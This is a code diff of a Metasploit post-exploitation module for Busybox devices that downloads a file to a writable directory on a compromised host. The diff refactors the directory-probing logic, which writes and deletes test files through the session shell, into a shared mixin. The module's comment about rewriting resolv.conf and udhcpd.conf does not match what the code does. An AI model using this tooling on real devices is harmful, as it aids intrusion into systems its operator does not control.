@@ -8,6 +8,7 @@ require 'msf/core'
 class Metasploit3 < Msf::Post
 
   include Msf::Post::File
+  include Msf::Post::Linux::Busybox
 
   def initialize
     super(
@@ -30,19 +31,15 @@ class Metasploit3 < Msf::Post
       [
         OptString.new('URL', [true, 'Full URL of file to download.'])
       ], self.class)
-
   end
 
+  #
   #The module tries to update resolv.conf file with the SRVHOST dns address. It tries to update
   #udhcpd.conf too, with SRVHOST dns address, that should be given to network's hosts via dhcp
-
+  #
   def run
     vprint_status("Trying to find writable directory.")
-    writable_directory = nil
-    writable_directory = "/etc/" if is_writable_directory("/etc")
-    writable_directory = "/mnt/" if (!writable_directory && is_writable_directory("/mnt"))
-    writable_directory = "/var/" if (!writable_directory && is_writable_directory("/var"))
-    writable_directory = "/var/tmp/" if (!writable_directory && is_writable_directory("/var/tmp"))
+    writable_directory = get_writable_directory()
     if writable_directory
       vprint_status("writable directory found, downloading file.")
       rand_str = ""; 16.times{rand_str  << (65 + rand(25)).chr}
@@ -58,32 +55,6 @@ class Metasploit3 < Msf::Post
     else
       print_error("Writable directory not found.")
     end
-  end
-
-  #This function checks if the target directory is writable
-
-  def is_writable_directory(directory_path)
-    retval = false
-    rand_str = ""; 16.times{rand_str  << (65 + rand(25)).chr}
-    file_path = directory_path + "/" + rand_str
-    session.shell_write("echo #{rand_str}XXX#{rand_str} > #{file_path}\n"); Rex::sleep(0.1)
-    (1..5).each{session.shell_read(); Rex::sleep(0.1)}
-    rcv = read_file(file_path)
-    vprint_status("is_writable_directory:"+rcv)
-    if rcv.include? (rand_str+"XXX"+rand_str)
-      retval = true
-    end
-    cmd_exec("rm -f #{file_path}"); Rex::sleep(0.1)
-    return retval
-  end
-
-  #file? doesnt work because test -f is not implemented in busybox
-  def file_exists(file_path)
-    s = read_file(file_path)
-    if s and s.length
-      return true
-    end
-    return false
   end
 
 end
